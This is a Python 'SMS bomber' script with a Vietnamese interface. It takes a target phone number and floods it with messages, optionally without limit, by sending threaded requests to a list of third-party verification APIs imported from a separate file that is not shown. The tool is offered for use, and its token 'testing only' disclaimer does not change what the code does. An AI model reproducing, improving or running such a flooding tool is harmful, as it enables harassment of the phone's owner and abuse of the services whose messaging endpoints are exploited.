# -*- coding: utf-8 -*-
import requests
import time
import os
import threading
from colorama import Fore, Style, init
from apis import API_LIST  # Import danh sách API từ file apis.py

# Khởi tạo colorama
init(autoreset=True)

# Banner và thông tin
def banner():
    """Hiển thị banner và thông tin của tool."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + Style.BRIGHT + r"""
██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║███████╗██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """)
    print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════")
    print(Fore.GREEN + Style.BRIGHT + "            TOOL SPAM SMS - BOMBER V1 BY SIGMA")
    print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════")
    print(Fore.RED + "Author: Sigma")
    print(Fore.RED + "Version: 1.0 (2025)")
    print(Fore.RED + "GitHub: (Cập nhật link GitHub của bạn ở đây)")
    print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════")
    print(Fore.WHITE + "Lưu ý: Tool chỉ dùng cho mục đích thử nghiệm, không lạm dụng.")
    print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════\n")

# Hàm gửi tin nhắn từ một API cụ thể
def send_request(phone_number, api_config):
    """Gửi một yêu cầu spam đến một API."""
    try:
        # Thay thế placeholder {phone} bằng số điện thoại
        api_config['url'] = api_config['url'].replace('{phone}', phone_number)
        if 'data' in api_config:
            for key, value in api_config['data'].items():
                if isinstance(value, str):
                    api_config['data'][key] = value.replace('{phone}', phone_number)
        if 'json' in api_config:
             for key, value in api_config['json'].items():
                if isinstance(value, str):
                    api_config['json'][key] = value.replace('{phone}', phone_number)

        method = api_config.get('method', 'POST').upper()
        
        if method == 'POST':
            response = requests.post(
                api_config['url'],
                data=api_config.get('data'),
                json=api_config.get('json'),
                headers=api_config.get('headers'),
                timeout=10
            )
        elif method == 'GET':
             response = requests.get(
                api_config['url'],
                params=api_config.get('params'),
                headers=api_config.get('headers'),
                timeout=10
            )
        else:
            print(f"{Fore.RED}[-] Phương thức {method} không được hỗ trợ.")
            return

        if response.status_code in [200, 201, 204]:
            print(f"{Fore.GREEN}[+] Gửi thành công từ {api_config['name']} tới {phone_number}")
        else:
            print(f"{Fore.YELLOW}[-] Gửi thất bại từ {api_config['name']} | Status: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Lỗi kết nối: {e}")
    except Exception as e:
        print(f"{Fore.RED}[!] Lỗi không xác định: {e}")

# Hàm chính điều khiển việc spam
def start_spamming(phone_number, num_messages):
    """Bắt đầu quá trình spam SMS."""
    threads = []
    message_count = 0
    
    print(f"\n{Fore.CYAN}[*] Bắt đầu quá trình spam tới số: {phone_number}")
    if num_messages == 0:
        print(f"{Fore.CYAN}[*] Chế độ: Vô hạn (Nhấn Ctrl+C để dừng)")
    else:
        print(f"{Fore.CYAN}[*] Số lượng tin nhắn cần gửi: {num_messages}")
    print(Fore.YELLOW + "----------------------------------------------------")
    
    try:
        if num_messages == 0:
            while True:
                for api in API_LIST:
                    thread = threading.Thread(target=send_request, args=(phone_number, api.copy()))
                    threads.append(thread)
                    thread.start()
                    time.sleep(0.1) # Giảm độ trễ giữa các request
                
                for t in threads:
                    t.join() # Chờ tất cả các thread hoàn thành chu kỳ hiện tại
                threads = [] # Xóa danh sách thread cũ
                message_count += len(API_LIST)
                print(f"\n{Fore.BLUE}Đã hoàn thành một lượt gửi. Tổng số: {message_count}. Bắt đầu lượt mới...\n")

        else:
            for i in range(num_messages):
                api = API_LIST[i % len(API_LIST)] # Lặp lại danh sách API
                thread = threading.Thread(target=send_request, args=(phone_number, api.copy()))
                threads.append(thread)
                thread.start()
                time.sleep(0.2) # Thêm độ trễ để tránh quá tải
                
                # Dọn dẹp các thread đã hoàn thành để tránh quá tải bộ nhớ
                threads = [t for t in threads if t.is_alive()]
            
            # Chờ các thread cuối cùng hoàn thành
            for t in threads:
                t.join()

    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Đã dừng bởi người dùng. Đang chờ các tác vụ cuối cùng hoàn tất...")
        # Không cần join() ở đây vì vòng lặp đã bị ngắt
    finally:
        print(f"\n{Fore.GREEN}════════════════════════════════════════════════")
        print(f"{Fore.GREEN}            HOÀN THÀNH TÁC VỤ SPAM!")
        print(f"{Fore.GREEN}════════════════════════════════════════════════\n")


# Hàm chính của chương trình
def main():
    """Hàm main để chạy tool."""
    banner()
    while True:
        phone_number = input(f"{Fore.YELLOW}➤ Nhập số điện thoại cần spam (ví dụ: 0987654321): {Style.RESET_ALL}").strip()
        if phone_number.isdigit() and len(phone_number) >= 9 and len(phone_number) <= 11:
            # Chuẩn hóa số điện thoại về dạng không có số 0 ở đầu nếu cần
            if phone_number.startswith('0'):
                phone_number = phone_number[1:]
            break
        else:
            print(f"{Fore.RED}[!] Số điện thoại không hợp lệ. Vui lòng nhập lại.")

    while True:
        try:
            num_messages_str = input(f"{Fore.YELLOW}➤ Nhập số lượng tin nhắn (nhập 0 để spam vô hạn): {Style.RESET_ALL}").strip()
            num_messages = int(num_messages_str)
            if num_messages >= 0:
                break
            else:
                print(f"{Fore.RED}[!] Vui lòng nhập một số không âm.")
        except ValueError:
            print(f"{Fore.RED}[!] Đây không phải là một số hợp lệ. Vui lòng nhập lại.")

    start_spamming(phone_number, num_messages)

if __name__ == "__main__":
    main()
